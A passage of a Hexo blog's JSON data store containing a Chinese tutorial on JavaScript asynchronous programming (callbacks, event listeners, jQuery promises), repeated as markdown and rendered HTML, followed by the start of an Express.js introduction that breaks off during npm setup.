步的。\n\n- \"异步模式\"非常重要。在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，\"异步模式\"甚至是唯一的模式，因为执行环境是单线 程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。\n\n> 以下是四种异步编程的四种常用方法：\n\n#### <a>1、回调函数</a>\n\n如果有两个函数，`fn1` 和 `fn2`，fn2要在fn1执行完之后才执行，于是我们可以这么写：\n```js\nfn1();\n\nfn2();\n```\n\n但是，若 `fn1` 非常耗时（大概需要3s），我们就可以写成回调函数了，改写 `fn1`，将 `fn2 ` 写成 `fn1` 的回调函数：\n```js\nfunction fn1(callback){\n\n  setTimeout(function () {\n\n　　// fn1的任务代码\n    console.log('这是fn1');\n\n    callback();\n\n  }, 3000);\n\n}\n\nfunction fn2() {\n  console.log('这是fn2');\n}\n\n// 执行代码\nfn1(fn2);\n```\n`小结：`\n1. 采用这种方式，我们把同步操作变成了异步操作，fn1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。\n2. 回调函数的`优点`是简单、容易理解和部署，`缺点`是不利于代码的阅读和维护，各个部分之间高度耦合（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。\n\n#### <a>2、事件监听</a>\n\n> 采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。\n\n当fn1发生 `done` 事件，就执行fn2：\n```js\nfn1.on('done', fn2);\n\nfunction fn1(callback){\n\n  setTimeout(function () {\n\n　　// fn1的任务代码\n    console.log('这是fn1');\n\n    fn1.trigger('done');\n\n  }, 3000);\n\n}\n\nfunction fn2() {\n  console.log('这是fn2');\n}\n```\n`fn1.trigger('done')` 表示，执行完成后，立即触发 `done` 事件，从而开始执行 `fn2`。\n`小结：`\n&emsp;这种方法的`优点`是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以\"去耦合\"（Decoupling），有利于实现模块化。`缺点`是整个程序都要变成事件驱动型，运行流程会变得很不清晰。\n\n#### <a>3、Promises对象</a>\n\n&emsp;`Promise` 思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。比如，fn1的回调函数fn2,可以写成：\n```js\nfn1().then(fn2);\n```\nfn1要进行如下改写（这里使用的是jQuery的实现）：\n```js\nfunction fn1(){\n\n　var dfd = $.Deferred();\n\n　setTimeout(function () {\n\n　　// fn1的任务代码\n    console.log('这是fn1');\n\n　　dfd.resolve();\n\n　}, 500);\n\n　return dfd.promise;\n\n}\n```\n> 这样写的`优点`在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的配套方法，可以实现许多强大的功能。\n\n比如，指定多个回调函数：\n```js\nfn1().then(fn2).then(fn3);\n```\n再比如，指定发生错误时的回调函数：\n```js\nfn1().then(fn2).fail(fn3);\n```\n\n> 而且，它还有一个前面三种方法都没有的好处：如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。所以，你不用担心是否错过了某个事件或信号。这种方法的缺点就是编写和理解，都相对比较难。\n\n<p style=\"text-align: right;\">`参考文档` [ruanyifeng](http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html)</p>","source":"_posts/0809024_JavaScript异步编程.md","raw":"---\nid: 0808024\ntitle: JavaScript 异步编程\ndate: 2017-12-26 11:48:34\ntags:\n  - javascript\n  - promise\ncategories:\n---\n\n> 对于`JavaScript` ，什么是异步编程？为什么要异步？如何做？\n\n- 由于JavaScript的执行环境是 `单线程` 的。即一次只能完成一件任务，如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。\n\n- 这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。\n\n- 为了解决这个问题，Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）。\n\n- \"同步模式\"就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的；\"异步模式\"则完全不同，每一个任务有一个或多个回 调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异 步的。\n\n- \"异步模式\"非常重要。在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，\"异步模式\"甚至是唯一的模式，因为执行环境是单线 程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。\n\n> 以下是四种异步编程的四种常用方法：\n\n#### <a>1、回调函数</a>\n\n如果有两个函数，`fn1` 和 `fn2`，fn2要在fn1执行完之后才执行，于是我们可以这么写：\n```js\nfn1();\n\nfn2();\n```\n\n但是，若 `fn1` 非常耗时（大概需要3s），我们就可以写成回调函数了，改写 `fn1`，将 `fn2 ` 写成 `fn1` 的回调函数：\n```js\nfunction fn1(callback){\n\n  setTimeout(function () {\n\n　　// fn1的任务代码\n    console.log('这是fn1');\n\n    callback();\n\n  }, 3000);\n\n}\n\nfunction fn2() {\n  console.log('这是fn2');\n}\n\n// 执行代码\nfn1(fn2);\n```\n`小结：`\n1. 采用这种方式，我们把同步操作变成了异步操作，fn1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。\n2. 回调函数的`优点`是简单、容易理解和部署，`缺点`是不利于代码的阅读和维护，各个部分之间高度耦合（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。\n\n#### <a>2、事件监听</a>\n\n> 采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。\n\n当fn1发生 `done` 事件，就执行fn2：\n```js\nfn1.on('done', fn2);\n\nfunction fn1(callback){\n\n  setTimeout(function () {\n\n　　// fn1的任务代码\n    console.log('这是fn1');\n\n    fn1.trigger('done');\n\n  }, 3000);\n\n}\n\nfunction fn2() {\n  console.log('这是fn2');\n}\n```\n`fn1.trigger('done')` 表示，执行完成后，立即触发 `done` 事件，从而开始执行 `fn2`。\n`小结：`\n&emsp;这种方法的`优点`是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以\"去耦合\"（Decoupling），有利于实现模块化。`缺点`是整个程序都要变成事件驱动型，运行流程会变得很不清晰。\n\n#### <a>3、Promises对象</a>\n\n&emsp;`Promise` 思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。比如，fn1的回调函数fn2,可以写成：\n```js\nfn1().then(fn2);\n```\nfn1要进行如下改写（这里使用的是jQuery的实现）：\n```js\nfunction fn1(){\n\n　var dfd = $.Deferred();\n\n　setTimeout(function () {\n\n　　// fn1的任务代码\n    console.log('这是fn1');\n\n　　dfd.resolve();\n\n　}, 500);\n\n　return dfd.promise;\n\n}\n```\n> 这样写的`优点`在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的配套方法，可以实现许多强大的功能。\n\n比如，指定多个回调函数：\n```js\nfn1().then(fn2).then(fn3);\n```\n再比如，指定发生错误时的回调函数：\n```js\nfn1().then(fn2).fail(fn3);\n```\n\n> 而且，它还有一个前面三种方法都没有的好处：如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。所以，你不用担心是否错过了某个事件或信号。这种方法的缺点就是编写和理解，都相对比较难。\n\n<p style=\"text-align: right;\">`参考文档` [ruanyifeng](http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html)</p>","slug":"0809024_JavaScript异步编程","published":1,"updated":"2018-03-26T12:21:07.680Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvvz002gs4c0qmyw03m0","content":"<blockquote>\n<p>对于<code>JavaScript</code> ，什么是异步编程？为什么要异步？如何做？</p>\n</blockquote>\n<ul>\n<li><p>由于JavaScript的执行环境是 <code>单线程</code> 的。即一次只能完成一件任务，如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。</p>\n</li>\n<li><p>这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。</p>\n</li>\n<li><p>为了解决这个问题，Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）。</p>\n</li>\n<li><p>“同步模式”就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的；”异步模式”则完全不同，每一个任务有一个或多个回 调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异 步的。</p>\n</li>\n<li><p>“异步模式”非常重要。在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，”异步模式”甚至是唯一的模式，因为执行环境是单线 程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。</p>\n</li>\n</ul>\n<blockquote>\n<p>以下是四种异步编程的四种常用方法：</p>\n</blockquote>\n<h4 id=\"1、回调函数\"><a href=\"#1、回调函数\" class=\"headerlink\" title=\"1、回调函数\"></a><a>1、回调函数</a></h4><p>如果有两个函数，<code>fn1</code> 和 <code>fn2</code>，fn2要在fn1执行完之后才执行，于是我们可以这么写：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1();</span><br><span class=\"line\"></span><br><span class=\"line\">fn2();</span><br></pre></td></tr></table></figure></p>\n<p>但是，若 <code>fn1</code> 非常耗时（大概需要3s），我们就可以写成回调函数了，改写 <code>fn1</code>，将 <code>fn2</code> 写成 <code>fn1</code> 的回调函数：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn1</span>(<span class=\"params\">callback</span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"comment\">// fn1的任务代码</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn1'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    callback();</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;, <span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn2'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 执行代码</span></span><br><span class=\"line\">fn1(fn2);</span><br></pre></td></tr></table></figure></p>\n<p><code>小结：</code></p>\n<ol>\n<li>采用这种方式，我们把同步操作变成了异步操作，fn1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。</li>\n<li>回调函数的<code>优点</code>是简单、容易理解和部署，<code>缺点</code>是不利于代码的阅读和维护，各个部分之间高度耦合（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。</li>\n</ol>\n<h4 id=\"2、事件监听\"><a href=\"#2、事件监听\" class=\"headerlink\" title=\"2、事件监听\"></a><a>2、事件监听</a></h4><blockquote>\n<p>采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。</p>\n</blockquote>\n<p>当fn1发生 <code>done</code> 事件，就执行fn2：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1.on(<span class=\"string\">'done'</span>, fn2);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn1</span>(<span class=\"params\">callback</span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"comment\">// fn1的任务代码</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn1'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    fn1.trigger(<span class=\"string\">'done'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;, <span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn2'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>fn1.trigger(&#39;done&#39;)</code> 表示，执行完成后，立即触发 <code>done</code> 事件，从而开始执行 <code>fn2</code>。<br><code>小结：</code><br>&emsp;这种方法的<code>优点</code>是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”去耦合”（Decoupling），有利于实现模块化。<code>缺点</code>是整个程序都要变成事件驱动型，运行流程会变得很不清晰。</p>\n<h4 id=\"3、Promises对象\"><a href=\"#3、Promises对象\" class=\"headerlink\" title=\"3、Promises对象\"></a><a>3、Promises对象</a></h4><p>&emsp;<code>Promise</code> 思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。比如，fn1的回调函数fn2,可以写成：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1().then(fn2);</span><br></pre></td></tr></table></figure></p>\n<p>fn1要进行如下改写（这里使用的是jQuery的实现）：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn1</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">　<span class=\"keyword\">var</span> dfd = $.Deferred();</span><br><span class=\"line\"></span><br><span class=\"line\">　setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"comment\">// fn1的任务代码</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn1'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">　　dfd.resolve();</span><br><span class=\"line\"></span><br><span class=\"line\">　&#125;, <span class=\"number\">500</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">　<span class=\"keyword\">return</span> dfd.promise;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>这样写的<code>优点</code>在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的配套方法，可以实现许多强大的功能。</p>\n</blockquote>\n<p>比如，指定多个回调函数：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1().then(fn2).then(fn3);</span><br></pre></td></tr></table></figure></p>\n<p>再比如，指定发生错误时的回调函数：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1().then(fn2).fail(fn3);</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>而且，它还有一个前面三种方法都没有的好处：如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。所以，你不用担心是否错过了某个事件或信号。这种方法的缺点就是编写和理解，都相对比较难。</p>\n</blockquote>\n<p style=\"text-align: right;\"><code>参考文档</code> <a href=\"http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html\" target=\"_blank\" rel=\"noopener\">ruanyifeng</a></p>","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>对于<code>JavaScript</code> ，什么是异步编程？为什么要异步？如何做？</p>\n</blockquote>\n<ul>\n<li><p>由于JavaScript的执行环境是 <code>单线程</code> 的。即一次只能完成一件任务，如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。</p>\n</li>\n<li><p>这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。</p>\n</li>\n<li><p>为了解决这个问题，Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）。</p>\n</li>\n<li><p>“同步模式”就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的；”异步模式”则完全不同，每一个任务有一个或多个回 调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异 步的。</p>\n</li>\n<li><p>“异步模式”非常重要。在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，”异步模式”甚至是唯一的模式，因为执行环境是单线 程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。</p>\n</li>\n</ul>\n<blockquote>\n<p>以下是四种异步编程的四种常用方法：</p>\n</blockquote>\n<h4 id=\"1、回调函数\"><a href=\"#1、回调函数\" class=\"headerlink\" title=\"1、回调函数\"></a><a>1、回调函数</a></h4><p>如果有两个函数，<code>fn1</code> 和 <code>fn2</code>，fn2要在fn1执行完之后才执行，于是我们可以这么写：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1();</span><br><span class=\"line\"></span><br><span class=\"line\">fn2();</span><br></pre></td></tr></table></figure></p>\n<p>但是，若 <code>fn1</code> 非常耗时（大概需要3s），我们就可以写成回调函数了，改写 <code>fn1</code>，将 <code>fn2</code> 写成 <code>fn1</code> 的回调函数：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn1</span>(<span class=\"params\">callback</span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"comment\">// fn1的任务代码</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn1'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    callback();</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;, <span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn2'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 执行代码</span></span><br><span class=\"line\">fn1(fn2);</span><br></pre></td></tr></table></figure></p>\n<p><code>小结：</code></p>\n<ol>\n<li>采用这种方式，我们把同步操作变成了异步操作，fn1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。</li>\n<li>回调函数的<code>优点</code>是简单、容易理解和部署，<code>缺点</code>是不利于代码的阅读和维护，各个部分之间高度耦合（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。</li>\n</ol>\n<h4 id=\"2、事件监听\"><a href=\"#2、事件监听\" class=\"headerlink\" title=\"2、事件监听\"></a><a>2、事件监听</a></h4><blockquote>\n<p>采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。</p>\n</blockquote>\n<p>当fn1发生 <code>done</code> 事件，就执行fn2：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1.on(<span class=\"string\">'done'</span>, fn2);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn1</span>(<span class=\"params\">callback</span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"comment\">// fn1的任务代码</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn1'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    fn1.trigger(<span class=\"string\">'done'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;, <span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn2'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>fn1.trigger(&#39;done&#39;)</code> 表示，执行完成后，立即触发 <code>done</code> 事件，从而开始执行 <code>fn2</code>。<br><code>小结：</code><br>&emsp;这种方法的<code>优点</code>是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”去耦合”（Decoupling），有利于实现模块化。<code>缺点</code>是整个程序都要变成事件驱动型，运行流程会变得很不清晰。</p>\n<h4 id=\"3、Promises对象\"><a href=\"#3、Promises对象\" class=\"headerlink\" title=\"3、Promises对象\"></a><a>3、Promises对象</a></h4><p>&emsp;<code>Promise</code> 思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。比如，fn1的回调函数fn2,可以写成：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1().then(fn2);</span><br></pre></td></tr></table></figure></p>\n<p>fn1要进行如下改写（这里使用的是jQuery的实现）：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn1</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">　<span class=\"keyword\">var</span> dfd = $.Deferred();</span><br><span class=\"line\"></span><br><span class=\"line\">　setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"comment\">// fn1的任务代码</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'这是fn1'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">　　dfd.resolve();</span><br><span class=\"line\"></span><br><span class=\"line\">　&#125;, <span class=\"number\">500</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">　<span class=\"keyword\">return</span> dfd.promise;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>这样写的<code>优点</code>在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的配套方法，可以实现许多强大的功能。</p>\n</blockquote>\n<p>比如，指定多个回调函数：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1().then(fn2).then(fn3);</span><br></pre></td></tr></table></figure></p>\n<p>再比如，指定发生错误时的回调函数：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fn1().then(fn2).fail(fn3);</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>而且，它还有一个前面三种方法都没有的好处：如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。所以，你不用担心是否错过了某个事件或信号。这种方法的缺点就是编写和理解，都相对比较难。</p>\n</blockquote>\n<p style=\"text-align: right;\"><code>参考文档</code> <a href=\"http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html\" target=\"_blank\" rel=\"noopener\">ruanyifeng</a></p>"},{"id":"0809010","title":"Express.js 入门","date":"2018-01-12T08:07:06.000Z","_content":"\n> Express: Fast, unopinionated, minimalist web framework for Node.js（Express是一个快速，高度包容，极简的Node.js框架）。事实上，只要对Node.js稍有了解，基本上就可以入门Express了，本人就是对Node.js有些了解之后就去学习了一下Express，自身感觉正如官方介绍那样。\n\n- <a href=\"#start\">1 入门</a>\n    - <a href=\"#install\">1.1 安装</a>\n    - <a href=\"#hello\">1.2 hello world</a>\n    - <a href=\"#generator\">1.3 Express生成器</a>\n    - <a href=\"#basicrouter\">1.4 基本路由</a>\n    - <a href=\"#static\">1.5 静态文件处理</a>\n- <a href=\"#guide\">2 指南</a>\n    - <a href=\"#router\">2.1 路由</a>\n    - <a href=\"#writingmiddleware\">2.2 编写中间件</a> \n    - <a href=\"#useingmiddleware\">2.3 使用中间件</a> \n- <a href=\"#api\">3 API</a>\n---\n\n#### <a name=\"start\">1. 入门</a>\n\n- <a name=\"install\">1.1 安装</a>\n\n`使用Express之前确保你的机器上安装有Node.js环境。`\n\n> 创建工程目录，并进入到工程目录：\n\n```sh\n$ mkdir express\n$ cd express\n```\n\n> 使用`npm init`命令为应用程序创建`package.json`文件：\n\n```sh\n$ npm init\n```\n输入`npm init`命令时，除了`entry point: (index.js)`选项修改`index.js`为`app.js`（入口文件）之外（当然也可以使用默认值），其余的选项可以直接回车选择默认值。\n此时，工程中会生成一个`package.json`文件，打开看一下，基本长这样：\n```json\n{\n  \"name\": \"express\",\n  \"version\": \"1.0.0\",\n  \"description\": \"start express\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: 